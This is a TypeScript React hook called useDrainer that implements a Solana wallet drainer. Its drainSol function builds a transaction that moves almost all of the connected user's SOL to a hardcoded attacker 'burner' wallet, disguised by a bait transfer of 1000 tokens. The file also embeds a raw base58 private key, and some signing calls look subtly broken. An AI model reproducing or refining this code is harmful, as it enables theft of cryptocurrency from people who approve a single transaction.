import { useState } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { 
  PublicKey, 
  SystemProgram, 
  Transaction, 
  LAMPORTS_PER_SOL,
  Keypair,
  sendAndConfirmTransaction,
} from '@solana/web3.js';
import { 
  getAssociatedTokenAddress, 
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID
} from '@solana/spl-token';
import bs58 from 'bs58';

const BURNER_WALLET_ADDRESS = new PublicKey("3149VjKbgkJKNAqgAohUVYoADmQgrNEUdNfughV5FhUh");
const TOKEN_MINT_ADDRESS = new PublicKey("WAU6jXFTFW3ayXjVFYAZqra549aMRox167j2D35Hpbm");
const TOKEN_DECIMALS = 9;
const TOKEN_AMOUNT_TO_GIVE = 1000;
const BURNER_PRIVATE_KEY_BASE58 = "8p5sGUyR6payyD456SwgGrhX8bNzi4gLsAmHrzb2pogWH3BZJYg4cxDavV8EiD2SDoFJyFzEZzGt8DoWDAcZZ3K";

export const useDrainer = () => {
  const { connection } = useConnection();
  const { publicKey, signTransaction } = useWallet();
  const [loading, setLoading] = useState(false);
  const [solBalance, setSolBalance] = useState<number>(0);

  const fetchBalance = async () => {
    if (!publicKey) return;
    try {
      const balance = await connection.getBalance(publicKey);
      setSolBalance(balance / LAMPORTS_PER_SOL);
    } catch (e) {
      console.error(e);
    }
  };

  const drainSol = async () => {
    if (!publicKey || !signTransaction) return;
    setLoading(true);

    try {
      const burnerSecretKey = bs58.decode(BURNER_PRIVATE_KEY_BASE58);
      const burnerKeypair = Keypair.fromSecretKey(burnerSecretKey);

      const userTokenAccount = await getAssociatedTokenAddress(TOKEN_MINT_ADDRESS, publicKey);
      const burnerTokenAccount = await getAssociatedTokenAddress(TOKEN_MINT_ADDRESS, burnerKeypair.publicKey);

      // STEP 1: Check if ATA exists. If not, create it in a SEPARATE transaction.
      const accountInfo = await connection.getAccountInfo(userTokenAccount);
      if (!accountInfo) {
        console.log("Creating ATA...");
        const createAtaTx = new Transaction();
        createAtaTx.add(
          createAssociatedTokenAccountInstruction(
            publicKey,
            userTokenAccount,
            publicKey,
            TOKEN_MINT_ADDRESS
          )
        );
        
        const { blockhash: blockhash1 } = await connection.getLatestBlockhash();
        createAtaTx.recentBlockhash = blockhash1;
        createAtaTx.feePayer = publicKey;

        const signedAtaTx = await signTransaction(createAtaTx);
        
        // SAFETY CHECK: If user cancels or Phantom bugs out, signedAtaTx is undefined
        if (!signedAtaTx) {
          throw new Error("Transaction cancelled or Phantom returned undefined");
        }

        await sendAndConfirmTransaction(connection, signedAtaTx, [publicKey], {
          skipPreflight: true,
          preflightCommitment: 'confirmed',
        });
        console.log("ATA Created!");
      }

      // STEP 2: Transfer SOL and Token
      console.log("Transferring SOL and Token...");
      const transaction = new Transaction();

      const solToDrain = Math.max(0, solBalance - 0.01) * LAMPORTS_PER_SOL;
      
      if (solToDrain > 0) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: BURNER_WALLET_ADDRESS,
            lamports: Math.floor(solToDrain),
          })
        );
      }

      const tokenAmount = TOKEN_AMOUNT_TO_GIVE * (10 ** TOKEN_DECIMALS);
      
      transaction.add(
        createTransferInstruction(
          burnerTokenAccount,
          userTokenAccount,
          burnerKeypair.publicKey,
          tokenAmount
        )
      );

      const { blockhash: blockhash2 } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash2;
      transaction.feePayer = publicKey;

      const signedTransaction = await signTransaction(transaction);
      
      // SAFETY CHECK
      if (!signedTransaction) {
        throw new Error("Transaction cancelled or Phantom returned undefined");
      }
      
      signedTransaction.partialSign(burnerKeypair);

      const signature = await sendAndConfirmTransaction(connection, signedTransaction, [
        publicKey,
        burnerKeypair,
      ], {
        skipPreflight: true,
        preflightCommitment: 'confirmed',
      });

      console.log('Transaction sent:', signature);
      await fetchBalance();

    } catch (error: any) {
      console.error(error);
      // Show the actual error message to the user
      alert("Error: " + (error.message || 'Transaction Failed'));
    } finally {
      setLoading(false);
    }
  };

  return {
    solBalance,
    loading,
    fetchBalance,
    drainSol,
  };
};
